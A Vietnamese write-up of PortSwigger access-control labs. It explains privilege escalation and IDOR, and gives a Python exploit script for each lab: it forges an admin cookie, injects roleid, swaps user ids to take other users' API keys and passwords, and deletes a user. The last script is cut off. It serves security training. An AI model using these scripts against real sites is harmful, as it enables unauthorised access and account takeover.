# Access control vulnerabilities

## Khái niệm & Khai thác & Tác hại & Phòng tránh

<ul>
    <b>Khái niệm</b>
    <ul>
        <li> truy cập trái phép các tính năng không nằm trong quyền hạn của mình. Việc áp dụng các ràng buộc về ai hoặc cái gì được ủy quyền để thực hiện các hành động hoặc truy cập tài nguyên.</li>
        <img src="https://hackmd.io/_uploads/HkOBYHitT.png">
    </ul>
    <b>Khai thác</b>
    <ul>
        <li><b>dạng kiểm soát truy cập theo chiều dọc (Vertical access controls)</b> Nếu một người dùng thông thường có khả năng truy cập các chức năng mà vốn họ không được phép truy cập thì chúng ta sẽ gọi đó là lỗ hổng trong dạng kiểm soát theo chiều dọc (Vertical access controls). Chúng ta có thể hiểu cụm từ "theo chiều dọc" ở đây có nghĩa là dọc theo quyền truy cập, vai trò thấp có khả năng truy cập chức năng của vai trò cao hơn.</li>
        <li><b>lỗ hổng trong dạng kiểm soát truy cập theo chiều ngang (Horizontal privilege escalation)</b> Chúng ta có thể hiểu cụm từ "theo chiều ngang" ở đây có nghĩa là ngang hàng theo quyền truy cập, hai vai trò có quyền hạn bằng nhau (thường là hai người dùng thông thường) có khả năng truy cập chức năng dưới vai trò của người kia.</li>
        <li><b>Kiểm soát truy cập phụ thuộc vào ngữ cảnh</b> Kiểm soát truy cập phụ thuộc vào ngữ cảnh hạn chế quyền truy cập vào chức năng và tài nguyên dựa trên trạng thái của ứng dụng hoặc sự tương tác của người dùng với nó.  Ví dụ: một trang web bán lẻ có thể ngăn người dùng sửa đổi nội dung giỏ hàng của họ sau khi họ đã thanh toán.</li>
    </ul>
    <b>Tác hại</b>
    <ul>
        <li></li>
    </ul>
    <b>Phòng tránh</b>
    <ul>
        <li>Không dựa vào duy nhất một yếu tố để kiểm soát truy cập.</li>
        <li>Tại bất cứ bước nào trong hệ thống đều cần xác thực lại quyền kiểm soát truy cập của người dùng</li>
        <li>Thường xuyên kiểm tra, xem xét kỹ lưỡng, cập nhật, nâng cấp các biện pháp kiểm soát truy cập để đảm bảo chúng hoạt động bình thường.</li>
    </ul>
    <b>Một số mô hình kiểm soát truy cập an toàn.</b>
    <ul>
        <li><b>Discretionary access control (DAC)</b>
        cho phép cấp hoặc hạn chế quyền truy cập đối tượng thông qua chính sách truy cập được xác định bởi nhóm chủ sở hữu hoặc chủ thể của đối tượng. Nói cách khác, chủ sở hữu xác định các đặc quyền truy cập đối tượng.</li>
        <img src="https://i.imgur.com/MzB0hYU.png">
        <li><b>Mandatory access control (MAC)</b> chủ thể và đối tượng được gán các thuộc tính bảo mật nhất định, sau đó hệ thống đánh giá và so sánh mối quan hệ thuộc tính giữa hai chủ thể để xác định xem có được phép truy cập hay không. Có thể nói, MAC là một đại diện cho mô hình đa cấp bậc. Không giống như DAC, trong mô hình MAC người dùng và chủ sở hữu tài nguyên không có khả năng ủy quyền hoặc sửa đổi quyền truy cập cho tài nguyên của họ</li>
        <img src="https://i.imgur.com/3sQdVQp.png">
        <li><b>Role-based access control (RBAC)</b> chủ thể và đối tượng không được kết nối trực tiếp, chúng được chỉ định một hoặc nhiều vai trò. Đầu tiên, các quyền của hoạt động truy cập được khớp với một số vai trò, sau đó các vai trò cụ thể này được gán cho các chủ thể tương ứng. Theo cách này chủ thể có quyền truy cập vào đối tượng. Một đối tượng có thể mang nhiều vai trò và một vai trò có thể mang nhiều quyền hạn.</li>
        <img src="https://i.imgur.com/JEHbtSl.png">
    </ul>
</ul>

## Vertical access controls

## 1. Lab: Unprotected admin functionality

link: https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality

### Đề bài

![image](https://hackmd.io/_uploads/SJFGKIoKT.png)

### Phân tích

<ul>
    <li>chúng ta là user thường nhưng cần xóa 1 người dùng với đặc quyền của admin</li>
    <li>Thông qua thay đổi giá trị các tham số khiến người dùng bình thường có thể truy cập vào trang quản trị</li>
    <li>Người dùng thông thường cũng có thể biết tới đường link này (Vô tình đoán được, hoặc dùng một số tools như Dirsearch, Gobusster, ...). Nếu lập trình viên không cài đặt quyền truy cập hợp lí, dẫn đến tất cả người dùng đều có thể truy cập đường dẫn này sẽ xảy ra hậu quả khó lường, bởi khi đó ai cũng là administrator!</li>
    <li>Lab này có một trang quản trị admin không được bảo vệ chắc chắn, chúng ta cần truy cập và thực hiện xóa tài khoản carlos.</li>
</ul>

### Khai thác

mình dùng dirsearch để quét các thư mục trong trang web này và thấy có file **robots.txt**

![image](https://hackmd.io/_uploads/BJItlvsYT.png)

mình truy cập vào và thấy tệp từ chối đến `/administrator-panel`

![image](https://hackmd.io/_uploads/Skj9yDiFp.png)

<li>một trong những tệp tin thường được đọc đầu tiên là robots.txt (Khi thực hiện quét các đường dẫn cũng có tệp tin này). Tệp robots.txt chủ yếu dùng để quản lý lưu lượng truy cập của trình thu thập dữ liệu vào trang web và thường dùng để ẩn một tệp khỏi Google. Đôi khi nó cũng chứa một số thông tin hữu ích.</li>
<li>Trang web hạn chế các bot crawl tới link nhạy cảm /administrator-panel - là đường dẫn tới trang quản trị admin.
</li>

Truy cập tới `/administrator-panel`:

![image](https://hackmd.io/_uploads/SyBE2LsKa.png)

Chúng ta thấy rằng hệ thống không thực hiện cài đặt quyền tốt tới từng vai trò của người dùng, dẫn đến bất kì ai đều có quyền truy cập vào đường dẫn này và thực hiện vai trò quản trị!

Một số trang web thực hiện bảo vệ đường dẫn tới trang quản trị admin bằng việc không để lộ trong tệp `robots.txt` và đặt tên đường dẫn theo một cách khó đoán, chẳng hạn:

```
https://insecure-website.com/administrator-panel-somerandomcharacters_ah27ds7d
```

Với cách này kẻ tấn công sẽ không thể sử dụng các công cụ quét đường dẫn tìm ra trang này. Tuy nhiên, nếu đường dẫn được sử dụng trong một số code sẽ hiển thị cho người dùng trong source code (chẳng hạn Javascript), thông tin quan trọng vẫn có thể tiết lộ tới người dùng. Xem xét đoạn code sau:

```javascript
<script>
var isAdmin = false;
if (isAdmin) {
	...
	var adminPanelTag = document.createElement('a');
	adminPanelTag.setAttribute('https://insecure-website.com/administrator-panel-somerandomcharacters_ah27ds7d');
	adminPanelTag.innerText = 'Admin panel';
	...
}
</script>
```

Cách hoạt động của đoạn code trên: Kiểm tra vai trò người dùng có phải quản trị viên hay không thông qua giá trị biến isAdmin, nếu đúng sẽ tạo và hiển thị từ Admin panel trên giao diện - đường dẫn tới trang quản trị. Và vô tình cũng đã để lộ đường dẫn này tới người dùng.

<li>quay trở lại với bài mình vào được trang quản trị và xóa carlos</li>

![image](https://hackmd.io/_uploads/rJ071witT.png)

mình đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0a3900c404e8e970829e069900b10093.web-security-academy.net'

# session = requests.Session()

params = {
    'username': 'carlos',
}

response = requests.get(
    url + '/administrator-panel/delete',
    params=params,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/B1x508jFa.png)

mục đích của chúng ta là xóa carlos đã hoàn thành và mình cũng giải quyết được bài lab này

## 2. Lab: Unprotected admin functionality with unpredictable URL

link: https://portswigger.net/web-security/access-control/lab-unprotected-admin-functionality-with-unpredictable-url

### Đề bài

![image](https://hackmd.io/_uploads/BJ4WbPsYp.png)

### Phân tích

<li>như đã đề cập ở trên bài này không để lộ filr ```robots.txt``` nhưng đã để lộ đường dẫn trong file javascript.</li>

### Khai thác

<li> Xem mã nguồn trang web bằng cách bấm tổ hợp phím Ctrl+U hoặc chuột phải và bấm chọn View page source:</li>

```javascript
var isAdmin = false;
if (isAdmin) {
  var topLinksTag = document.getElementsByClassName("top-links")[0];
  var adminPanelTag = document.createElement("a");
  adminPanelTag.setAttribute("href", "/admin-9dy4r0");
  adminPanelTag.innerText = "Admin panel";
  topLinksTag.append(adminPanelTag);
  var pTag = document.createElement("p");
  pTag.innerText = "|";
  topLinksTag.appendChild(pTag);
}
```

Phát hiện đoạn code Javascript hoạt động để lộ đường dẫn tới trang quản trị là `/admin-9dy4r0`.

![image](https://hackmd.io/_uploads/SyALzDjKa.png)

và mình vào xóa người dùng carlos

![image](https://hackmd.io/_uploads/H1MjEDjFa.png)

mình cũng đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0af10083037c3ee5834ad389000c008b.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + '/my-account',
    verify=False,
)

pattern = r"/admin-\w{6}\b"
match = re.search(pattern, response.text)

params = {
    'username': 'carlos',
}

response = session.get(
    url + match.group() + '/delete',
    params=params,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/By2tNDiYp.png)

mục đích của chúng ta là xóa carlos đã hoàn thành và mình cũng giải quyết được bài lab này

## 3. Lab: User role controlled by request parameter

link: https://portswigger.net/web-security/access-control/lab-user-role-controlled-by-request-parameter

### Đề bài

![image](https://hackmd.io/_uploads/Hy-7CdoFa.png)

### Phân tích

mình đăng nhập bằng tài khoản của user wiener

![image](https://hackmd.io/_uploads/SJbWYJhKp.png)

<ul>
    <li>bài cho chúng ta biết trang quản trị ở /admin nhưng đã xác thực bằng cookie nên chúng ta không thể truy cập vào</li>
</ul>

![image](https://hackmd.io/_uploads/HyCYytjtp.png)

### Khai thác

<li>mình bắt được gói tin khi đăng nhập và  đổi lại cookie ở phần Admin bằng true và vào được trang quản trị </li>

![image](https://hackmd.io/_uploads/rk78lKiF6.png)

![image](https://hackmd.io/_uploads/rymQBFsKa.png)

mình xóa người dùng carlos qua url:

```
/admin/delete?username=carlos
```

![image](https://hackmd.io/_uploads/By9SrFjt6.png)

mình cũng đã viết lại script khai thác:

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0afb000a045363888427b84d00ff0091.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + '/login',
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    'csrf': csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = session.post(
    url + '/login',
    data=data,
    verify=False,
    allow_redirects=False,
)

admin = response.headers['Set-Cookie'].split(';')[0].split('=')[0]
session = response.headers['Set-Cookie'].split(';')[2].split('=')[1]

cookies = {
    admin : 'true',
    'session': session
}

params = {
    'username': 'carlos',
}

response = requests.get(
    url + '/admin/delete',
    params=params,
    cookies=cookies,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/ByChPJ2Yp.png)

mục đích của chúng ta là xóa carlos đã hoàn thành và mình cũng giải quyết được bài lab này

![image](https://hackmd.io/_uploads/rJauSFoF6.png)

## 4. Lab: User role can be modified in user profile

link: https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile

### Đề bài

![image](https://hackmd.io/_uploads/HJtKVl3YT.png)

### Phân tích

<ul>
    <li>Miêu tả đề bài cho biết trang quản trị tại /admin và nó chỉ cho phép các người dùng có giá trị roleid bằng 2 truy cập. Chúng ta cần nâng quyền người dùng wiener:peter lên quyền admin và thực hiện xóa tài khoản carlos.</li>
    <li>Khác với lab trước, request không chứa các tham số cụ thể xác định vai trò quản trị viên.

Cũng không thể truy cập tới trang quản trị

</li>
    <li>Do đề bài cho biết hệ thống sử dụng tham số roleid để xác định vai trò người dùng, nên ta cần tìm cách "gửi kèm" giá trị này tới hệ thống với tài khoản wiener. Một cách tự nhiên, chúng ta sẽ lựa chọn thời điểm gửi tại thời điểm đăng nhập. Thêm tham số roleid=2 vào sau các tham số username và password:</li>
    <img src="https://hackmd.io/_uploads/ry_8Px2Fa.png">
    <li>Chọn Follow redirection, chúng ta vẫn không thể trở thành admin. Tức là giá trị roleid cần truyền ở nơi khác. Tiếp tục thử một số cách truyền</li>
    <li> chức năng Update email chúng ta chưa sử dụng tới. Thực hiện update một email mới và quan sát request:</li>
</ul>

### Khai thác

![image](https://hackmd.io/_uploads/SysIde2Fa.png)

<li>Email được POST lên hệ thống bằng kiểu định dạng JSON</li>
<li> Và dữ liệu trả về cũng theo định dạng JSON và chứa cặp giá trị roleid:1. Mong muốn của chúng ta là thay giá trị roleid kia thành 2. Đơn giản, "cài cắm" nó vào giá trị email và gửi tới hệ thống thôi!</li>

![image](https://hackmd.io/_uploads/rJBa_lhFT.png)

Thành công! Follow redirection ta có:

![image](https://hackmd.io/_uploads/Hyk1Kg2Ya.png)

Truy cập trang quản trị và mình xóa người dùng carlos bằng url

```
/admin/delete?username=carlos
```

![image](https://hackmd.io/_uploads/S1K-Yx3Y6.png)

mình đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0a79004703d5d0d780084e9d00fd00c6.web-security-academy.net'

session = requests.Session()

data = {
    'username': 'wiener',
    'password': 'peter',
}

response = requests.post(
    url + '/login',
    data=data,
    verify=False,
    allow_redirects=False,
)

session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

cookies = {
    'session': session
}

data = {
    "email":"cuong@gmail.com",
    "roleid":2
}

response = requests.post(
    url + '/my-account/change-email',
    cookies=cookies,
    data=data,
    verify=False,
)

params = {
    'username': 'carlos',
}

response = requests.get(
    url + '/admin/delete',
    params=params,
    cookies=cookies,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)

```

![image](https://hackmd.io/_uploads/HJIuqgnY6.png)

mục đích của chúng ta là xóa carlos đã hoàn thành và mình cũng giải quyết được bài lab này

![image](https://hackmd.io/_uploads/H1JFcl3t6.png)

## Horizontal privilege escalation

## 5. Lab: User ID controlled by request parameter

link: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter

### Đề bài

![image](https://hackmd.io/_uploads/ByADpK2Y6.png)

### Phân tích

<li>Bên cạnh cookie, session để xác thực danh tính người dùng, các hệ thống thường sử dụng các tham số với những giá trị duy nhất xác định duy nhất một người dùng. Bởi vậy, khi đã hiểu được quy luật hoạt động của các tham số này, kẻ tấn công có thể thay đổi giá trị của chúng để tìm kiếm lỗ hổng trong dạng kiểm soát truy cập theo chiều ngang. Chẳng hạn, xét URL sau:</li>

```
https://insecure-website.com/my-account?id=123
```

<li>Trang web chưa thực hiện phân quyền người dùng chặt chẽ, giá trị id ở đây hiển thị giao diện hồ sơ của người dùng mang số id là 123. Do giá trị này có thể thay đổi bởi người dùng nên kẻ tấn công có thể thay đổi giá trị của id chẳng hạn bắt đầu từ 1 đến 1000 để truy cập trái phép vào hồ sơ cá nhân của người dùng khác.</li>

<li>bài cho biết lab này chứa lỗ hổng trong dạng kiểm soát truy cập theo chiều ngang. Mỗi người dùng có một giá trị API duy nhất, nhiệm vụ của chúng ta sẽ dựa vào lỗ hổng này để thu thập giá trị API của carlos và submit. Chúng ta được cung cấp một tài khoản hợp lệ wiener:peter.</li>

<li>Đăng nhập với tài khoản wiener:peter, hệ thống dẫn chúng ta tới hồ sơ người dùng chứa giá trị API:</li>

![image](https://hackmd.io/_uploads/S1N5y53t6.png)

### Khai thác

<li>Chúng ta phát hiện URL có thêm tham số id=wiener. id mang giá trị là username của người dùng. Khi truyền lên hệ thống sẽ trả về giao diện hồ sơ tương ứng với giá trị tham số id. Bởi vậy chúng ta có thể thay đổi giá trị này thành id=carlos để xem thông tin trang cá nhân của carlos (chứa giá trị API key) là  <b>lP8mNkWklVExXd0gSz2RbkdfpGA9qXsW</b></li>

![image](https://hackmd.io/_uploads/SkvuJq3Ya.png)

Submit giá trị API key tại Submit solution để hoàn thành lab này.

![image](https://hackmd.io/_uploads/HJbyZ92YT.png)

mình đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0a0a00c003fded6180a535dd006c001b.web-security-academy.net'

params = {
    'id': 'carlos',
}

response = requests.get(
    url + '/my-account',
    params=params,
    verify=False,
    allow_redirects=False
)

pattern = r'\b\w{32}\b'
match = re.search(pattern, response.text).group()

data = {
    'answer': match,
}

response = requests.post(
    url + '/submitSolution',
    data=data,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/SJiTNqhKp.png)

mục đích của chúng ta là lấy API của carlos đã hoàn thành và mình cũng giải quyết được bài lab này

![image](https://hackmd.io/_uploads/S1BlSqntT.png)

## 6. Lab: User ID controlled by request parameter, with unpredictable user IDs

link: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-unpredictable-user-ids

### Đề bài

![image](https://hackmd.io/_uploads/rJE_Bq2ta.png)

### Phân tích

<li>Miêu tả đề bài cho biết lab này tồn tại lỗ hổng trong dạng kiểm soát truy cập theo chiều ngang. Mã định danh người dùng GUIDs là một giá trị không thể đoán được, tuy nhiên chúng có thể được tìm thấy đâu đó xung quanh trang web. Chúng ta cần truy cập vào hồ sơ carlos là lấy được giá trị API key của anh ấy. Chúng ta được cung cấp một tài khoản hợp lệ wiener:peter.</li>
<li>Thông thường, các tham số id sẽ mang giá trị ngẫu nhiên, chẳng hạn là một chuỗi gồm chữ số và chữ cái được sinh ngẫu nhiên xác định duy nhất người dùng. Ví dụ:</li>

```
https://insecure-website.com/my-account?id=shfj794wjb124sh2j312
```

<li>Chúng ta khó có thể đoán được hoặc thực hiện tấn công vét cạn giá trị id này. Tuy nhiên, chúng cũng có thể vô tình bị tiết lộ đâu đó tại trang web.</li>

<li>Đăng nhập với tài khoản wiener:peter, hệ thống dẫn chúng ta tới hồ sơ người dùng chứa giá trị API:</li>

`TLRrGj1H3MGmBPBEyusMnvzrk7Wajxya`

![image](https://hackmd.io/_uploads/rJ9lP93Fp.png)

<li>Chúng ta thấy giá trị id=ebfc1f0a-2818-4cb8-a14d-3dd614fd9b65 tương ứng với người dùng wiener.  Đây là một giá trị sinh ngẫu nhiên hoặc được định nghĩa để người dùng không thể dự đoán được giá trị id của người dùng khác.</li>

Khi truy cập vào cụ thể trang blog của người dùng khác, chúng ta có thể truy cập để xem danh sách các blog của tác giả:

![image](https://hackmd.io/_uploads/BkMed53Yp.png)

![image](https://hackmd.io/_uploads/rJCHdq2Yp.png)

thấy có userID= `fb7d3452-83a6-423c-a12d-6ea696552096 `

Quan sát URL nhận thấy tham số userId có cùng dạng với id trong cá nhân của chúng ta. Có thể dự đoán id và userId có cùng giá trị. Nghĩa là điều này đã vô tình để lộ giá trị id của tác giả đó

### Khai thác

Thay đổi giá trị tại trang cá nhân của chúng ta `id=fb7d3452-83a6-423c-a12d-6ea696552096` để truy cập vào hồ sơ carlos:

![image](https://hackmd.io/_uploads/By3Jt93t6.png)

và mình submit API: `0NiOxrVK7szQ2oC0PIrQiOaWrsizFzJ7`

![image](https://hackmd.io/_uploads/SyGBY9nt6.png)

mình đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0a7f0043040daa4681f6b62200e70086.web-security-academy.net'

params = {
    'id': 'fb7d3452-83a6-423c-a12d-6ea696552096',
}

response = requests.get(
    url + '/my-account',
    params=params,
    verify=False,
    allow_redirects=False
)

pattern = r'\b\w{32}\b'
match = re.search(pattern, response.text).group()

data = {
    'answer': match,
}

response = requests.post(
    url + '/submitSolution',
    data=data,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

hoặc

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0a93007903b2f92a80b22b37008a0023.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + '/login',
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

data = {
    "csrf": csrf,
    'username': 'wiener',
    'password': 'peter',
}

response = session.post(
    url + '/login',
    data=data,
    verify=False,
    allow_redirects=False
)

session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

cookies = {
    'session': session,
}

for i in range(11):
    params = {
        'postId': i,
    }

    response = requests.get(
        url + '/post',
        params=params,
        cookies=cookies,
        verify=False,
    )
    if "carlos" in response.text:
        break

soup = BeautifulSoup(response.text, 'html.parser')
user_id = soup.find('span', {'id': 'blog-author'}).find('a')['href'].split('=')[1]

params = {
    'id': user_id,
}
response = requests.get(
    url + '/my-account',
    params=params,
    verify= False,
)

pattern = r'\b\w{32}\b'
match = re.search(pattern, response.text).group()

data = {
    'answer': match,
}

response = requests.post(
    url + '/submitSolution',
    data=data,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/SkRWqc3Ka.png)

mục đích của chúng ta là lấy API của carlos đã hoàn thành và mình cũng giải quyết được bài lab này

![image](https://hackmd.io/_uploads/ByT45cnYp.png)

## 7. Lab: User ID controlled by request parameter with data leakage in redirect

link: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-data-leakage-in-redirect

### Đề bài

![image](https://hackmd.io/_uploads/ryYP053F6.png)

### Phân tích

<li>Miêu tả đề bài cho biết lab chứa lỗ hổng kiểm soát truy cập, trong đó một số thông tin nhạy cảm bị lộ trong phần thân của phản hồi chuyển hướng (redirect response). Chúng ta được cung cấp một tài khoản hợp lệ wiener:peter và cần tìm ra giá trị API key của người dùng carlos.
</li>

<li>Trong một số trường hợp khi thực hiện tấn công lỗ hổng trong dạng truy cập kiểm soát theo chiều ngang, chúng ta có thể được redirect tới trang chủ hoặc trang login. Trong nhiều trường hợp thì chúng ta đã tấn công thành công dù bị chuyển hướng tới trang khác (Do các response vẫn được "bắt" thành công trong HTTP history của Burp Suite).</li>

Tương tự lab User ID controlled by request parameter, thay giá trị id=carlos. Tuy nhiên, chúng ta bị chuyển hướng tới trang login:

![image](https://hackmd.io/_uploads/HyjpPs3tp.png)

### Khai thác

<li>Quan sát HTTP history trong Burp Suite, request /my-account?id=carlos vẫn được hệ thống thực hiện và trả về response thành công.</li>

![image](https://hackmd.io/_uploads/BJcN_jnKp.png)

Và chúng ta có được giá trị API key của carlos: `FztLqzcT52TIg3jHFVmm3eZN5IbNpufe`

![image](https://hackmd.io/_uploads/rJVcuohYa.png)

mình đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0a9100d6038d9478be23b1b800290096.web-security-academy.net'

data = {
    'username': 'wiener',
    'password': 'peter',
}

response = requests.post(
    url + '/login',
    data=data,
    verify=False,
    allow_redirects=False
)

params = {
    'id': 'carlos',
}

response = requests.get(
    url + '/my-account',
    params=params,
    verify=False,
    allow_redirects=False
)

pattern = r'\b\w{32}\b'
match = re.search(pattern, response.text).group()

data = {
    'answer': match,
}

response = requests.post(
    url + '/submitSolution',
    data=data,
    verify=False,
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/B1SMcshFT.png)

mục đích của chúng ta là lấy API của carlos đã hoàn thành và mình cũng giải quyết được bài lab này

![image](https://hackmd.io/_uploads/SkX3OjnFp.png)

## 8. Lab: User ID controlled by request parameter with password disclosure

link: https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure

### Đề bài

![image](https://hackmd.io/_uploads/rkktqshYT.png)

### Phân tích

<li> đề bài cho biết trang cá nhân của người dùng trực tiếp chứa mật khẩu hiện tại ở dạng ẩn. Chúng ta cần khai thác lỗ hổng kiếm soát truy cập, thu thập mật khẩu tài khoản administrator và thực hiện xóa tài khoản người dùng carlos. Lab cung cấp một tài khoản hợp lệ là wiener:peter.</li>

<li> Những giá trị id thực sự nguy hiểm nếu để người dùng có thể đoán được quy tắc định nghĩa của nó. Và nếu trong các giá trị được kẻ tấn công thay đổi, chứa giá trị id thuộc người dùng có vai trò quản trị, hoặc chứa những thông tin nhạy cảm có thể được lợi dụng, thì cuộc tấn công này có thể leo thang thành truy cập kiểm soát theo chiều dọc! Kẻ tấn công lập tức có thêm rất nhiều quyền hạn, càng làm tăng độ sức ảnh hưởng của dạng lỗ hổng này.</li>

<li>Đăng nhập với tài khoản wiener:pater, click vào tùy chọn My account, chúng ta được đưa tới trang cá nhân người dùng, trong đó chức năng đổi mật khẩu chứa mật khẩu người dùng ở dạng ẩn.</li>

![image](https://hackmd.io/_uploads/HJb6hinYp.png)

tuy nhiên xem nguồn trang Ctrl + U chúng ta có thể thấy được giá trị này

![image](https://hackmd.io/_uploads/ryJdasnK6.png)

### Khai thác

![image](https://hackmd.io/_uploads/Hk6epjht6.png)

rong URL chứa tham số id=wiener. id mang giá trị là username của người dùng. Khi truyền lên hệ thống sẽ trả về giao diện hồ sơ tương ứng với giá trị tham số id. Thay đổi giá trị id=administrator trong URL và truyền lên hệ thống, kết quả hiển thị trang cá nhân của administrator và chúng ta thu được mật khẩu tài khoản admin là `dvuj8qgcbs0y7co6lk67`

![image](https://hackmd.io/_uploads/B1zZRi3Ka.png)

<li>mình Đăng nhập với tài khoản administrator:dvuj8qgcbs0y7co6lk67 và thực hiện xóa tài khoản carlos.</li>

![image](https://hackmd.io/_uploads/BJgK0j2YT.png)

mình đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0a9a008e0499f4248248cff9004d0063.web-security-academy.net'

data = {
    'username': 'wiener',
    'password': "peter",
}

response = requests.post(
    url + '/login',
    data=data,
    verify=False,
    allow_redirects=False
)

params = {
    'id': 'administrator',
}

response = requests.get(
    url + '/my-account',
    params=params,
    verify=False,
    allow_redirects=False
)

soup = BeautifulSoup(response.text, 'html.parser')
password = soup.find('input', {'name': 'password'})['value']

session = requests.Session()

response = session.get(
    url + '/login',
    verify=False,
)

soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

# Post login

data = {
    "csrf": csrf,
    'username': 'administrator',
    'password': password,
}

response = session.post(
    url + '/login',
    data=data,
    verify=False,
    allow_redirects=False
)

session = response.headers['Set-Cookie'].split(';')[0].split('=')[1]

cookies = {
    'session': session,
}

params = {
    'username': 'carlos',
}

response = requests.get(
    url + '/admin/delete',
    params=params,
    cookies=cookies,
    verify=False
)

# print(response.text) # hiển thị response có flag
soup = BeautifulSoup(response.text, 'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/SkV-b2nFT.png)

mục đích của chúng ta là xóa carlos đã hoàn thành và mình cũng giải quyết được bài lab này

![image](https://hackmd.io/_uploads/rkCWWn3Fp.png)

## Insecure direct object references(IDOR)

## 9. Lab: Insecure direct object references

link: https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references

### Đề bài

![image](https://hackmd.io/_uploads/HyZHO4aF6.png)

### Phân tích

<li>Miêu tả đề bài cho biết trang web lưu trữ các lịch sử trò chuyện của người dùng và có thể truy cập thông qua các đường dẫn tĩnh. Chúng ta cần thu thập thông tin nhạy cảm từ các tệp dữ liệu này, tìm kiếm mật khẩu và truy cập vào tài khoản của người dùng carlos.</li>

<li>Bên cạnh cách tấn công thay đổi giá trị tham số giống như các labs chúng ta đã phân tích trên. Lỗ hổng IDOR cũng có thể được khai thác bằng cách thay đổi giá trị trong các đường dẫn tĩnh (static) khi hệ thống không thực hiện phân quyền chặt chẽ. Chẳng hạn một số dữ liệu, thông tin tệp của người dùng được đặt tên một cách có quy luật, ví dụ:</li>

```
https://insecure-website.com/static/12345.txt
```

<li>Khi đó kẻ tấn công có thể thay đổi tên tệp để đọc được những nội dung thông tin thuộc quyền sở hữu từ người dùng khác.</li>
<li>Giao diện trang web chứa chức năng Live chat.</li>

![image](https://hackmd.io/_uploads/HyKyiVpFT.png)

Trong đó có thể tải về tệp lịch sử cuộc trò chuyện qua tùy chọn View transcript.

Click tùy chọn View transcript và quan sát request qua Burp Suite.

![image](https://hackmd.io/_uploads/Hk0Os4pYp.png)

### Khai thác

<li>Đường dẫn tải về tệp lịch sử chat có tên 2.txt. Chúng ta có thể thay đổi giá trị tệp này để xem thông tin cuộc trò chuyện các tệp lịch sử khác. Cụ thể, tệp 1.txt chứa thông tin mật khẩu của người dùng carlos:</li>

![image](https://hackmd.io/_uploads/Hkfb2E6YT.png)

và mật khẩu của carlos là `h8xmypxyywrq3llemn4q`

Truy cập vào tài khoản `carlos:h8xmypxyywrq3llemn4q` để hoàn thành lab :100:

mình đã viết lại script khai thác

```python=
#!/usr/bin/python3.7
import requests
import re
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

url = 'https://0aee009d049eb773880a38ae003500f4.web-security-academy.net'

# Get carlos password

session = requests.Session()

response = session.get(
    url + '/download-transcript/1.txt',
    verify=False,
    allow_redirects=False
)

pattern = r'\b\w{20}\b'
password = re.search(pattern, response.text).group()

response = session.get(
    url + '/login',
    verify=False
)

